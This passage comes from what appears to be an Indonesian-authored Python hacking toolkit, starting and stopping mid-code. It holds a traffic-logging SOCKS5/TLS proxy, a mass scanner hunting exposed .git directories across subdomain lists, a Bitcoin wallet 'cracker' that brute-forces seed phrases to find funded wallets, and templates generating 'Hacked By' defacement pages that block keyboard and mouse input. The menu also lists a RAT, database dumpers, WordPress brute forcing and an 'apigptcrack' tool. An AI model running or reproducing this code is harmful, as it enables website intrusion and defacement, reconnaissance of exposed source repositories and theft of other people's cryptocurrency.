                client_socket.close()
                return

            client_socket.sendall(b"\x05\x00")

            request = client_socket.recv(4)
            print(f"{colors['second']}[{colors['first']}SOCKS5-LOG{colors['second']}] {colors['first']}Raw request: {request}")

            try:
                if request[1] == 1:
                    handle_tcp(client_socket, address, port)
                    return

                elif len(request) < 4:
                    print(f"{color.red()}[{colors['first']}SOCKS5-LOG{color.red()}] {colors['first']}Invalid request length: {len(request)} - {request}")
                    client_socket.close()
                    return

                elif request[0] != 5:
                    print(f"{color.red()}[{colors['first']}SOCKS5-LOG{color.red()}] {colors['first']}Invalid SOCKS version: {request[0]}")
                    return

                elif request[1] != 1:
                    print(f"{color.red()}[{colors['first']}SOCKS5-LOG{color.red()}] {colors['first']}Invalid command: {request[1]}")
                    client_socket.close()
                    return

                elif request[1] == 3:
                    print(f"{colors['second']}[{colors['first']}SOCKS5-LOG{colors['second']}] {colors['first']}Handling UDP ASSOCIATE")
                    udp_associate(client_socket)

                address_type = request[3]
                if address_type == 1:
                    address = socket.inet_ntoa(client_socket.recv(4))
                elif address_type == 3:
                    domain_length = client_socket.recv(1)[0]
                    address = client_socket.recv(domain_length).decode()
                else:
                    print(f"{color.red()}[{colors['first']}SOCKS5-LOG{color.red()}] {colors['first']}Invalid address type")
                    client_socket.close()
                    return

                port = struct.unpack('!H', client_socket.recv(2))[0]

                if is_blocked(address):
                    print(f"{colors['second']}[{colors['first']}SOCKS5-LOG{colors['second']}] {colors['first']}Blocked address: {address}")
                    client_socket.close()
                    return

            except IndexError as e:
                print(f"{color.red()}[{colors['first']}SOCKS5-LOG{color.red()}] {colors['first']}Error: "+str(e))
                pass

            except:
                print(f"{color.red()}[{colors['first']}SOCKS5-LOG{color.red()}] {colors['first']}Error: "+str(e))
                pass

            try:
                remote_socket = socket.create_connection((address, port))
                client_socket.sendall(b"\x05\x00\x00\x01" + socket.inet_aton(address) + struct.pack('!H', port))

                print(f"{colors['second']}[{colors['first']}SOCKS5-LOG{colors['second']}] {colors['first']}Connected to {address}:{port}")
                print(f"{colors['second']}[{colors['first']}SOCKS5-LOG{colors['second']}] {colors['first']}Client request: {request}")

                relay_data(client_socket, remote_socket)

            except Exception as e:
                print(f"{color.red()}[{colors['first']}ERROR{color.red()}] {colors['first']}SOCKS5: {e}")
                client_socket.close()

        def handle_tls(client_socket, REMOTE_HOST, REMOTE_PORT):
            if is_blocked(REMOTE_HOST):
                print(f"{colors['second']}[{colors['first']}BLOCKED{colors['second']}] {colors['first']}TLS connection to {REMOTE_HOST}")
                client_socket.close()
                return
            try:
                context = ssl.create_default_context()
                remote_socket = socket.create_connection((REMOTE_HOST, REMOTE_PORT))
                remote_socket = context.wrap_socket(remote_socket, server_hostname=REMOTE_HOST)

                def relay_data(source, destination):
                    while True:
                        data = source.recv(4096)
                        if not data:
                            break
                        destination.sendall(data)

                client_to_server = threading.Thread(target=relay_data, args=(client_socket, remote_socket))
                client_to_server.start()

                relay_data(remote_socket, client_socket)

            except Exception as e:
                print(f"{color.red()}[{colors['first']}ERROR{color.red()}] {colors['first']}handle_client: {e}")
            finally:
                client_socket.close()
                remote_socket.close()

        def handle_udp(udp_socket):
            while True:
                data, addr = udp_socket.recvfrom(4096)

                if is_blocked(addr[0]):
                    print(f"{colors['second']}[{colors['first']}BLOCKED{colors['second']}] {colors['first']}UDP from {addr}")
                    continue

                print(f"{colors['second']}[{colors['first']}UDP-LOG{colors['second']}] {colors['first']}Data from {addr}: {data}")

        def relay_data(client_socket, remote_socket):
            start_time = time.time()
            total_bytes = 0
            sockets = [client_socket, remote_socket]
            try:
                while True:
                    if client_socket.fileno() == -1 or remote_socket.fileno() == -1:
                        print(f"{colors['second']}[{colors['first']}LOG{colors['second']}] {colors['first']}Socket closed, exiting relay")
                        break
                    ready_sockets, _, _ = select.select(sockets, [], [])
                    for sock in ready_sockets:
                        if sock.fileno() == -1:
                            print(f"{colors['second']}[{colors['first']}LOG{colors['second']}] {colors['first']}Socket closed during relay")
                            break
                        data = sock.recv(505536)
                        if not data:
                            print(f"{colors['second']}[{colors['first']}LOG{colors['second']}] {colors['first']}Connection closed")
                            client_socket.close()
                            remote_socket.close()
                            return
                        total_bytes += len(data)
                        elapsed_time = time.time() - start_time
                        if total_bytes == 0 or elapsed_time == 0:
                            speed = 0
                        else:
                            speed = total_bytes / elapsed_time / (364 * 366)
                        if sock is client_socket:
                            remote_socket.sendall(data)
                        else:
                            client_socket.sendall(data)
                        print(f"{colors['second']}[{colors['first']}LOG{colors['second']}] {colors['first']} Data: " + str(data.hex()[:10]) + f' Speed: {speed:.2f}MB/ps                         ', end='\r')
            except Exception as e:
                print(f"{color.red()}[{colors['first']}ERROR{color.red()}] {colors['first']} relay_data: {e}")

        def start_proxy():
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((PROXY_HOST, PROXY_PORT))
            server.listen(5)

            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_socket.bind((PROXY_HOST, PROXY_PORT))

            print(f"{colors['second']}[{colors['first']}!{colors['second']}] {colors['first']}Proxy launched on {PROXY_HOST}:{PROXY_PORT}")

            threading.Thread(target=handle_udp, args=(udp_socket,)).start()

            while True:
                try:
                    client_socket, addr = server.accept()
                    print(f"{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']}Incoming connections from {addr}", end='\r')

                    first_byte = client_socket.recv(1, socket.MSG_PEEK)
                    if first_byte == b"\x05":  # SOCKS5
                        threading.Thread(target=handle_socks5, args=(client_socket,)).start()
                    elif first_byte == b"\x16":
                        print(f"{colors['second']}[{colors['first']}TLS-LOG{colors['second']}] {colors['first']}Connection request from: "+str(addr))
                        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                        context.load_cert_chain(certfile="server.crt", keyfile="server.key")
                        client_socket = context.wrap_socket(client_socket, server_side=True)
                        request = client_socket.recv(65535).decode()
                        first_line = request.split("\n")[0]
                        host_port = first_line.split(" ")[1]
                        host, port = host_port.split(":")
                        port = int(port)
                        threading.Thread(target=handle_tls, args=(client_socket, host, port)).start()
                    else:  # HTTP
                        threading.Thread(target=handle_http, args=(client_socket,)).start()
                except KeyboardInterrupt:
                    print('\nExiting..')
                    break

        if __name__ == '__main__':
            start_proxy()

    def subdo_git():
        def script(file):
            global timeout, error, success, start_time
            results = []
            timeout = 0
            tmt_site = []
            error = 0
            success = 0
            subdo = [line.strip() for line in open(file, 'r').readlines() if line.strip()]
            GIT_PATH = ['.git', '.git/HEAD', '.git/config']

            total_subdomains = len(subdo)
            completed = 0
            start_time = time.time()

            def scan_subdomain(subdomain):
                nonlocal completed
                for path in GIT_PATH:
                    if subdomain.endswith('/'):
                        subdomain = subdomain.rstrip('/')
                    url = f'https://{subdomain}/{path}'
                    try:
                        response = requests.get(url, headers={"User-Agent": UserAgent().chrome}, timeout=8)
                        if response.status_code == 200:
                            results.append(url)
                            success += 1
                        else:
                            continue
                    except requests.exceptions.Timeout:
                        timeout += 1
                        continue
                    except requests.exceptions.RequestException:
                        error += 1
                        continue
                    except Exception as e:
                        error += 1
                        continue
                completed += 1

            def show_progress():
                while completed < total_subdomains:
                    progress = (completed / total_subdomains) * 100
                    elapsed_time = time.time() - start_time
                    print(f"\r{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']}Scanning progress: {progress:.2f}% | Elapsed: {elapsed_time:.2f}s", end='', flush=True)
                    time.sleep(0.5)
                    if progress >= 100:
                        break

            progress_thread = threading.Thread(target=show_progress)
            progress_thread.start()

            try:
                with ThreadPoolExecutor(max_workers=100) as executor:
                    futures = {executor.submit(scan_subdomain, subdomain): subdomain for subdomain in subdo}
                    for future in as_completed(futures):
                        future.result()
            except KeyboardInterrupt:
                print(f"\n{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']}KeyboardInterrupt detected. Exiting gracefully...")
                for future in futures:
                    future.cancel()

            progress_thread.join()
            print(f"\n{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']}Scanning completed!")
            return results

        file = input(f"{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']}Enter subdo list [.txt]: ")
        results = script(file)
        end_time = time.time()
        total_time = end_time - start_time
        print(f"\n{colors['second']}[{colors['first']}+{colors['second']}]{colors['first']} Total scanning time: {total_time:.2f} seconds / {total_time / 60:.2f} minutes")
        print(f"\n{colors['second']}[{colors['first']}+{colors['second']}]{colors['first']} Total timeout: {timeout}")
        print(f"\n{colors['second']}[{colors['first']}+{colors['second']}]{colors['first']} Total error: {error}")
        print(f"\n{colors['second']}[{colors['first']}+{colors['second']}]{colors['first']} Total success: {success}")
        try:
            for result in results:
                print(f"{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']}"+str(result))
        except KeyboardInterrupt:
            if results:
                for result in results:
                    print(f"{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']}"+str(result))
                return
            else:
                print('\nExitting..')
                return

    def show():
        clear()
        def feinfein():
            print('\n', end='\r')
            nick = ['Shoukaku07', 'Altair Ibn Laahad', './Szt00Xploit', 'Mr', '\rMrHexx', 'Arjun', 'Mis.style', 'Myself', 'God', '\033[0;31;40mJogjaXploit']
            ts = [0.75, 0.75, 0.75, 0.43, 0.43, 0.75, 0.75, 0.75, 0.43, 0.43]

            a=0
            for delay in ts:
                if a == 3:
                    print(nick[a], end='\r')
                else:
                    print(nick[a])
                time.sleep(delay)
                a += 1

        def second_attempt():
            print('\n', end='\r')
            first = ['Aint', 'Aint Asleep', 'Aint Asleep, Aint', 'Aint Asleep, Aint Aint', 'Aint Asleep, Aint Aint Aint(Aint)']
            ts = [0.17, 1.30, 0.83, 0.83, 0.43]
            a=0
            for delay in ts:
                print(first[a], end='\r', flush=True)
                time.sleep(delay)
                a += 1
            feinfein()

        def first_attempt():
            first = ['In', 'In the', 'In the night', 'In the night, Come         ', 'In the night, Come alive       ']
            ts = [0.17, 0.17, 1.25, 0.17, 0.17]
            a=0
            for delay in ts:
                print(first[a], end='\r', flush=True)
                time.sleep(delay)
                a += 1
            time.sleep(1.25)
            second_attempt()

        first_attempt()

    def btc_wallet_cracker():
        global total, tugas, futures
        total = 0
        tugas = 0

        def generate_seed():
            mnemo = Mnemonic("english")
            return mnemo.generate(strength=256)

        def get_balance(address):
            service = Service(network="bitcoin")
            try:
                return service.getbalance(address) / 1e8
            except Exception:
                return 0.0

        def import_wallet(passphrase):
            mnemo = Mnemonic("english")
            seed = mnemo.to_seed(passphrase)
            hdkey = HDKey.from_seed(seed, network="bitcoin")
            return hdkey.address()

        def login():
            global total, tugas
            passphrase = generate_seed()
            address = import_wallet(passphrase)
            balance = get_balance(address)

            total += 1
            print(f"Checked: {total} - {address} - {balance}", end='\r')

            if balance != 0.0:
                print(f"\n======== Wallet Found ========\nWallet: {address} - {passphrase} - BTC: {balance}\n")
                with open('searched_wallet.txt', 'a') as f:
                    f.write(f"Wallet: {address} - {passphrase} - BTC: {balance}\n")

            tugas += 1

        if __name__ == '__main__':
            max_workers = 500
            total_wallets = 1000000
            print("\n[!] Disclaimer: we DON'T care about the risk you take! it's your own consequences")

            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                try:
                    for _ in range(total_wallets):
                        executor.submit(login)
                except KeyboardInterrupt:
                    print('\nExiting..')
                    return

    class deface_html:
        def sc1(name, msg, team, logo, width, height, grts, file_name):
            sc1 = f"""
            <font color="white">
            <head>
                <title>HackedBy{name}</title>
                <table width="100%" height="90%">
                <tbody><tr><td align="center">
            <br><br>
            <br><br><font color="white">
            <i>

            <script type="text/javascript">
            alert("Hacked By: {name}");
            </script>

            <meta charset="utf-8">
            <link rel="preconnect" href="https://fonts.gstatic.com">
            <link href="https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap" rel="stylesheet">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
            """
            sc2 = "{font-family:Courier}img{opacity:80%}red{color:red}#background-video{height:100vh;width:100vw;object-fit:cover;position:fixed;left:0;right:0;top:0;bottom:0;z-index:-1}font{text-shadow:#000 0 0 3px;-webkit-font-smoothing:antialiased}div{animation:glitch 1s linear infinite}@keyframes glitch{2%,64%{transform:translate(2px,0) skew(0)}4%,60%{transform:translate(-2px,0) skew(0)}62%{transform:translate(0,0) skew(5deg)}}div:after,div:before{content:attr(title);position:absolute;left:0}div:before{animation:glitchTop 1s linear infinite;clip-path:polygon(0 0,100% 0,100% 33%,0 33%);-webkit-clip-path:polygon(0 0,100% 0,100% 33%,0 33%)}@keyframes glitchTop{2%,64%{transform:translate(2px,-2px)}4%,60%{transform:translate(-2px,2px)}62%{transform:translate(13px,-1px) skew(-13deg)}}div:after{animation:glitchBotom 1.5s linear infinite;clip-path:polygon(0 67%,100% 67%,100% 100%,0 100%);-webkit-clip-path:polygon(0 67%,100% 67%,100% 100%,0 100%)}@keyframes glitchBotom{2%,64%{transform:translate(-2px,0)}4%,60%{transform:translate(-2px,0)}62%{transform:translate(-22px,5px) skew(21deg)}}"
            sc3 = """{var e=document.documentElement;e.requestFullscreen?e.requestFullscreen():e.msRequestFullscreen?e.msRequestFullscreen():e.mozRequestFullScreen?e.mozRequestFullScreen():e.webkitRequestFullscreen&&e.webkitRequestFullscreen(),document.getElementById("body").style.cursor="http://cur.cursors-4u.net/symbols/sym-1/sym46.cur",document.onkeydown=function(e){return!1},document.addEventListener("keydown",e=>{"F11"==e.key&&e.preventDefault()})}"""
            r = "{return"
            i = "}"
            ueh = "{"
            oke = """;!function e(t){void 0===n[t]&&setTimeout(function(){e(0)},3e4),t<n[t].length&&function e(t,n,o){n<t.length?(document.getElementById("hekerabies").innerHTML=t.substring(0,n+1),setTimeout(function(){e(t,n+1,o)},150)):"function"==typeof o&&setTimeout(o,7e3)}(n[t],0,function(){e(t+1)})}(0)}"""
            rr = f"""["{msg}"]{oke}"""
            sc4 = f"{ueh}var n={rr}"
            sc5 = f"""
            <body bgcolor="black" text="white" oncontextmenu="return!1" onkeydown="return!1" onmousedown="return!1" onclick="document.getElementById(&quot;lagu&quot;).play(),fs()" id="body" onload="typeWriter()" data-new-gr-c-s-check-loaded="14.1097.0" data-gr-ext-installed=""><style type="text/css">center{sc2}</style><script language="JavaScript">function confirmExit(){r}"are you sure ? wkwk"{i}function fs(){sc3}window.onbeforeunload=confirmExit;</script><script id="rendered-js">document.addEventListener("DOMContentLoaded",function(e){sc4})</script><audio src="https://kosred.com/a/gavwen.mp3" autoplay="true" id="lagu" loop=""></audio><video id="background-video" src="https://kosred.com/a/oanknh.mp4" autoplay="" loop="" muted="" style="position:fixed;object-fit:cover" poster="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="><source src="hehe.mp4" type="video/webm"></video><table width="100%" height="80%"><tbody><tr><td><center><small>We ARE <red>{team}</red></small><br><img src="{logo}" width="{width}" height="{height}" Loading="Lazy" onerror="this.style.display=&quot;none&quot;"><font size="5"><br>Hacked by<red><i> {name}</i></red></font><br><font size="2" id="hekerabies">Oh No! The Security Has Been Hacked!</font><br><br><small><font size="1" color="gray">From {name}</font></small><div class="footer-greetings"><marquee><font size="2"><b>Greetz</b>: {grts}</font></marquee></div></center></td></tr></tbody></table><script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body><br>
            </div>
            </font>
            </body>
            </p>
            </span>
            """
            sc = sc1 + sc5
            target_directory = 'Deface'

            file_path = os.path.join(target_directory, file_name)

            def logging(file_path, file_name):
                try:
                    time.sleep(0.5)
                    with open(file_path + ".html", "w") as file:
                        file.write(str(sc))
                    print(f"Success make file {file_name}.html")
                except FileExistsError:
                    print(f"File {file_name}.html Already Exists !")

            logging(file_path, file_name)

        def sc2(name, msg, music, logo, width, height, grts, file_name):
            st1 = """
            {display:table;height:100%;width:100%;} body{background-color:black; } body{display:table-cell;vertical-align:middle;text-align:center;} img { opacity:0.8; }
            """
            sc1 = f"""
            <!DOCTYPE html>
            <html lang="en"><head></head><body bgcolor="black" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;">&lt;------------
            -------------- copyright {name} ------------&gt;
            <title>Hacked By {name}</title> <link href="https://fonts.googleapis.com/css?family=Shadows+Into+Light+Two" rel="stylesheet" type="text/css"> <meta content="Hacked By {name}" name="description"> <meta content="Hacked By {name}" name="keywords"> <meta content="Hacked By {name}" name="Abstract"> <meta name="title" content="Str0ng3"> <meta name="description" content=""> <meta name="keywords" content="Hacked"> <meta name="googlebot" content="index,follow"> <meta name="robots" content="all"> <meta name="robots schedule" content="auto"> <meta name="distribution" content="global"> <style type="text/css"> @import url('https://fonts.googleapis.com/css?family=Megrim'); html{st1} </style>   <center> <img src="{logo}" width="{width}" height="{height}"><br><br> <font face="Megrim" font="" color="white" size="6"><b>Hacked By {name}</b><br> </font></center> <center><font face="Shadows Into Light Two" color="#fff" size="3px">-=!!=- {msg} -=!!=-</font></center> <br> <font face="Shadows Into Light Two" color="#fff" size="3px">-= Greetz =-<br></font> <font face="Shadows Into Light Two" size="3px" color="#ff0000">=- {grts} -=<br></font>
            <audio src="{music}" loop="True" autoplay hidden></audio>
            </body></html>
            """
            sc = sc1
            target_directory = 'Deface'

            file_path = os.path.join(target_directory, file_name)

            def logging(file_path, file_name):
                try:
                    time.sleep(0.5)
                    with open(file_path + ".html", "w") as file:
                        file.write(str(sc))
                    print(f"Success make file {file_name}.html")
                except FileExistsError:
                    print(f"File {file_name}.html Already Exists !")

            logging(file_path, file_name)
        
        def sc3(name, msg, logo, file_name):
            sc1 = f"""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Hacked by {str(name)}</title>
                <style>
                    body, html {{
                        margin: 0;
                        padding: 0;
                        height: 100%;
                        overflow: hidden;
                        background-color: #000; /* Latar belakang hitam */
                    }}

                    .container {{
                        display: grid;
                        grid-template-columns: repeat(auto-fill, minmax(15px, 1fr));
                        grid-auto-rows: 15px;
                        width: 100%;
                        height: 100%;
                        position: absolute;
                        top: 0;
                        left: 0;
                    }}

                    .cube {{
                        background-color: #491410; /* Warna merah tua */
                        opacity: 0.1;
                        transition: opacity 0.5s ease, background-color 0.5s ease;
                    }}

                    .center-content {{
                        position: absolute;
                        top: 50%;
                        left: 50%;
                        transform: translate(-50%, -50%);
                        text-align: center;
                        z-index: 10;
                    }}

                    .profile-image {{
                        width: 300px; /* Ukuran gambar bisa disesuaikan */
                        height: 300px;
                        border-radius: 50%;
                        border: 5px solid #dc3c31;
                        object-fit: cover;
                        position: relative;
                        z-index: 2;
                    }}

                    .text-container {{
                        position: absolute;
                        top: 50%;
                        left: 50%;
                        transform: translate(-50%, -50%);
                        width: 360px; /* Ukuran container teks */
                        height: 360px;
                        border-radius: 50%;
                        border: 3px solid #dc3c31;
                        background-color: rgba(73, 20, 16, 0.8); /* Dark red dengan opacity */
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        z-index: 1;
                        box-shadow: 0 0 20px rgba(220, 60, 49, 0.5); /* Efek glow */
                    }}

                    .text-circle {{
                        position: relative;
                        width: 100%;
                        height: 100%;
                        animation: rotateText 12s linear infinite; /* Animasi putar teks */
                    }}

                    .text-circle span {{
                        position: absolute;
                        top: 0;
                        left: 50%;
                        transform-origin: 0 180px; /* Sesuaikan dengan radius lingkaran */
                        font-size: 18px;
                        color: #fff;
                        font-family: 'Courier New', Courier, monospace; /* Font hacking */
                        white-space: nowrap;
                    }}

                    /* Container untuk teks dengan animasi typing */
                    .typing-container {{
                        position: absolute;
                        top: calc(50% + 250px); /* Posisi di bawah image dan text circle */
                        left: 50%;
                        transform: translateX(-50%);
                        font-family: 'Courier New', Courier, monospace;
                        font-size: 24px;
                        color: #fff;
                        text-align: center;
                        white-space: nowrap;
                        overflow: hidden;
                    }}

                    /* Animasi typing */
                    @keyframes typing {{
                        from {{
                            width: 0;
                        }}
                        to {{
                            width: 100%;
                        }}
                    }}

                    /* Animasi berkedip */
                    @keyframes blink {{
                        50% {{
                            opacity: 0;
                        }}
                    }}

                    /* Kursor animasi */
                    .cursor {{
                        display: inline-block;
                        width: 2px;
                        height: 24px;
                        background-color: #fff;
                        animation: blink 1s infinite;
                    }}

                    @keyframes rotateText {{
                        0% {{
                            transform: rotate(360deg);
                        }}
                        100% {{
                            transform: rotate(0deg);
                        }}
                    }}
                </style>
            </head>
            <body>
                <div class="container" id="container"></div>

                <div class="center-content">
                    <div class="text-container">
                        <div class="text-circle" id="text-circle">
                            <!-- Teks akan di-generate secara otomatis oleh JavaScript -->
                        </div>
                    </div>
                    <img src="{str(logo)}" alt="Hacked by {str(name)}" class="profile-image">
                </div>

                <!-- Container untuk teks dengan animasi typing -->
                <div class="typing-container" id="typing-container">
                    <span id="typing-text"></span>
                    <span class="cursor"></span>
                </div>

                <script>
                    const container = document.getElementById('container');
                    const cubeSize = 15; // Ukuran kubus dalam piksel
                    const rows = Math.ceil(window.innerHeight / cubeSize);
                    const cols = Math.ceil(window.innerWidth / cubeSize);

                    // Warna merah untuk efek hacking
                    const hackingColors = ['#621b16', '#922820', '#dc3c31', '#ab2f26', '#f44336'];

                    // Fungsi untuk membuat grid kubus
                    function createGrid() {{
                        for (let i = 0; i < rows * cols; i++) {{
                            const cube = document.createElement('div');
                            cube.classList.add('cube');
                            container.appendChild(cube);
                        }}
                    }}

                    // Fungsi untuk mengubah warna dan opacity kubus secara acak
                    function hackingEffect() {{
                        const cubes = document.querySelectorAll('.cube');
                        cubes.forEach(cube => {{
                            if (Math.random() < 0.1) {{ // 10% kemungkinan kubus berubah
                                const randomColor = hackingColors[Math.floor(Math.random() * hackingColors.length)];
                                const randomOpacity = Math.random() * 0.9 + 0.1; // Opacity acak antara 0.1 dan 1
                                cube.style.backgroundColor = randomColor;
                                cube.style.opacity = randomOpacity;
                                setTimeout(() => {{
                                    cube.style.opacity = 0.1; // Kembali ke opacity rendah
                                }}, 500); // Kembali normal setelah 0.5 detik
                            }}
                        }});
                    }}

                    // Fungsi untuk membuat teks melingkar
                    function createCircularText() {{
                        const textCircle = document.getElementById('text-circle');
                        const text = "HACKEDBY{str(name).upper()}|HACKEDBY{str(name).upper()}|"; // Teks yang akan diputar
                        const radius = 125; // Radius lingkaran (sesuaikan dengan ukuran container)

                        // Hapus semua child element sebelumnya
                        textCircle.innerHTML = '';

                        // Loop untuk setiap karakter dalam teks
                        for (let i = 0; i < text.length; i++) {{
                            const span = document.createElement('span');
                            span.textContent = text[i];
                            const rotateDeg = (360 / text.length) * i; // Hitung sudut rotasi
                            span.style.transform = `rotate(${{rotateDeg}}deg)`;
                            textCircle.appendChild(span);
                        }}
                    }}

                    // Fungsi untuk animasi typing
                    function typeText() {{
                        const typingText = document.getElementById('typing-text');
                        const text = "{msg}"; // Teks yang akan dianimasikan
                        let index = 0;

                        function type() {{
                            if (index < text.length) {{
                                typingText.textContent += text.charAt(index);
                                index++;
                                setTimeout(type, 75); // Kecepatan typing (ms)
                            }} else {{
                                // Setelah selesai, tambahkan kursor berkedip
                                document.querySelector('.cursor').style.display = 'inline-block';
                            }}
                        }}

                        type();
                    }}

                    // Inisialisasi grid, efek hacking, teks melingkar, dan animasi typing
                    createGrid();
                    setInterval(hackingEffect, 100); // Ubah efek setiap 100ms
                    createCircularText(); // Buat teks melingkar
                    typeText(); // Jalankan animasi typing
                </script>
            </body>
            </html>
            """
            sc = sc1
            target_directory = 'Deface'

            file_path = os.path.join(target_directory, file_name)

            def logging(file_path, file_name):
                try:
                    time.sleep(0.5)
                    with open(file_path + ".html", "w") as file:
                        file.write(str(sc))
                    print(f"Success make file {file_name}.html")
                except FileExistsError:
                    print(f"File {file_name}.html Already Exists !")

            logging(file_path, file_name)
def __MAIN__():
    clear()
    print(banner.logo())
    while True:
        global prompts
        prompts = prompt()
        if now_path == 'menu1':
            if prompts.lower() == 'sqlite' or prompts == '1':
                tools.sqlite()
            elif prompts.lower() == 'changeusername':
                user_new = input("[+] New Username: ")
                if user_new:
                    with open('__system.file__/USER_/user.log', 'w') as file:
                        file.write(str(user_new)+'\r')
                    print('\n')
                else:
                    print("Please Fill\n")
                    pass
            elif prompts.lower() == 'menu':
                print(banner.menu())
            elif prompts.lower() == 'help':
                print(banner.help())
            elif prompts.lower() == 'changecolor':
                c = input('\n[+] Color [Available: Red_Yng, Cyan_Yng, Gold_Yng, Green_Yng]: ')
                if c.lower() == 'cyan_yng':
                    is_secondcolor = 'white'
                    is_firstcolor = 'cyan'
                elif c.lower() == 'gold_yng':
                    is_secondcolor = 'white'
                    is_firstcolor = 'gold'
                elif c.lower() == 'red_yng':
                    is_secondcolor = 'white'
                    is_firstcolor = 'dark_red'
                elif c.lower() == 'green_yng':
                    is_secondcolor = 'white'
                    is_firstcolor = 'green'
                else:
                    is_secondcolor = 'white'
                    is_firstcolor = 'white'

                output_string = 'is_default=444 | is_secondcolor={} | is_firstcolor={}'.format(is_secondcolor, is_firstcolor)
                with open('__system.file__/LOG_/default_color.log', 'w') as file:
                    file.write(str(output_string)+'\r')
                os.system('python3 pandorav2.py')
            elif prompts.lower() == 'admin finder' or prompts == '5':
                tools.admin_finder()
            elif prompts.lower() == 'dbdumper' or prompts == '3' or prompts.lower() == 'db dumper':
                tools.db_dumper()
            elif prompts.lower() == 'dbdumperv2' or prompts == '13' or prompts.lower() == 'db dumperv2' or prompts.lower() == 'db dumper v2':
                tools.db_dumperv2()
            elif prompts.lower() == 'apigptcrack' or prompts == '10':
                tools.api_gpt()
            elif prompts.lower() == 'netmonitor' or prompts == '11':
                tools.net_monitor()
            elif prompts.lower() == 'google osint' or prompts.lower() == 'googleosint' or prompts == '4':
                tools.google_osint()
            elif prompts.lower() == 'wpbf' or prompts == '2':
                tools.wpbf()
            elif prompts.lower() == 'rat' or prompts == '9':
                tools.rat()
            elif prompts.lower() == 'whois' or prompts == '12':
                tools.whois()
            elif prompts.lower() == 'dorker' or prompts == '7':
                tools.dorker()
            elif prompts.lower() == 'xdorker' or prompts.lower() == 'x-dorker' or prompts == '8':
                tools.Xdorker()
            elif prompts.lower() == 'ghostorm' or prompts == '14':
                tools.GHOST()
            elif prompts.lower() == 'lite_nmap' or prompts == '6' or prompts.lower() == 'litenmap' or prompts.lower() == 'lite-nmap' or prompts.lower() == 'lite nmap':
                if device == 1:
                    tools.lite_nmap()
                else:
                    tools.nmap_termux()
            elif prompts.lower() == 'cls' or prompts.lower() == 'clear':
                print(banner.logo())
            elif prompts.lower() == 'crawl' or prompts.lower() == '15':
                tools.crawl()
            elif prompts.lower() == 'l4dump' or prompts.lower() == '16':
                tools.l4_dump()
            elif prompts.lower() == 'site-seeker' or prompts.lower() == '17' or prompts.lower() == 'site seeker':
                tools.site_seeker()
            elif prompts.lower() == 'subdo-finder' or prompts.lower() == '18' or prompts.lower() == 'subdo finder':
                tools.subdo_finder()
            elif prompts.lower() == 'proxy-logger' or prompts.lower() == '19' or prompts.lower() == 'proxy logger':
                tools.proxy_logger()
            elif prompts.lower() == 'lite_nmap termux' or prompts.lower() == 'lite-nmap termux' or prompts.lower() == 'litenmap termux' or prompts.lower() == 'lite nmap termux' or prompts.lower() == '6 termux':
                tools.nmap_termux()
            elif prompts.lower() == 'lite_nmap linux' or prompts.lower() == 'lite-nmap linux' or prompts.lower() == 'litenmap linux' or prompts.lower() == 'lite nmap linux' or prompts.lower() == '6 linux':
                tools.lite_nmap()
            elif prompts.lower() == 'deface html' or prompts.lower() == 'defacehtml' or prompts.lower() == '20':
                print(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] 1. {colors['first']}--> Script Deface 1 [Simple and cool]")
                print(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] 2. {colors['first']}--> Script Deface 2 [Usually used]")
                print(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] 3. {colors['first']}--> Script Deface 2 [Inspired by Kurumi from Lycoris Recoil [Robota VS Kurumi scene]]")
                while True:
                    try:
                        pilihan = input(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] {colors['first']}--> ")
                        if pilihan.lower() == '1':
                            name = input(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] Attacker name {colors['first']}--> ")
                            msg = input(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] Message {colors['first']}--> ")
                            team = input(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] Team name {colors['first']}--> ")
                            logo = input(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] Logo URL {colors['first']}--> ")
                            width = input(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] Logo width {colors['first']}--> ")
                            height = input(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] Logo height {colors['first']}--> ")
                            grts = input(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] Greets {colors['first']}--> ")
                            file_name = input(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] Save as {colors['first']}--> ")
                            tools.deface_html.sc1(name, msg, team, logo, width, height, grts, file_name)
                        elif pilihan.lower() == '2':
                            name = input(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] Attacker name {colors['first']}--> ")
                            msg = input(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] Message {colors['first']}--> ")
                            music = input(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] Music URL {colors['first']}--> ")
                            logo = input(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] Logo URL {colors['first']}--> ")
                            width = input(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] Logo width {colors['first']}--> ")
